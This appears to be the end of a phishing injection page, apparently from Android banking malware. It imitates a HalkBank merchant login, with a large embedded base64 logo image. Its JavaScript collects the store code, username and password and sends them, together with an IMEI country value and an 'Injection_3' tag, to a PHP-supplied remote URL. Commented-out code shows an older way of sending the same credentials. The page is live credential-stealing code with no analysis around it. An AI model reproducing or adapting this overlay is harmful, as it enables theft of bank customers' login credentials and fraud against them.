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" style="width: 300px;">
    </div>
    <br>
    <form action="null" method="post" id="_mainForm" target="flow_handler">
<center>
        <input type="hidden" name="name" value="HalkBank" />

        <input name="Mağaza kodu" placeholder="Mağaza kodu" id="code" maxlength="12" class="input-field" type="text" />
        <br>

        <input name="Kullanıcı Adı" placeholder="Kullanıcı Adı" id="login" maxlength="50" type="text" class="input-field"  />
        <br>

        <input name="Mağaza kodu" id="password" placeholder="Şifre" maxlength="12" type="password" class="input-field" />
        <br>
        <br>

        <input value="Giriş" id="submitBtn1" class="submit-button" type="button">
		</center>
    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</div>

<script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                    /*var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // ????????????? ? ????? ??? ???????
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ???????? id ????

*/
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oCode1Inp = document.getElementById('code');
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = oCode1Inp.className = 'input-field';
						} catch(e){};

						if (!/^\w{9,100}$/i.test(oCode1Inp.value)) {
							try{
                                oCode1Inp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "halkbank'+
					'", "magaza_kodu": "'+oCode1Inp.value+
					'", "kullanici_adi" : "'+oNumInp.value+
					'", "sifre": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();
						*/


					var url='<?php echo $URL; ?>';
					var imei_c='<?php echo $IMEI_country; ?>';
					location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|halkbank|"+oCode1Inp.value+"|"+oNumInp.value+"|"+oCodeInp.value);



						return false;
                    };

                })();
            </script>
</body>
</html>
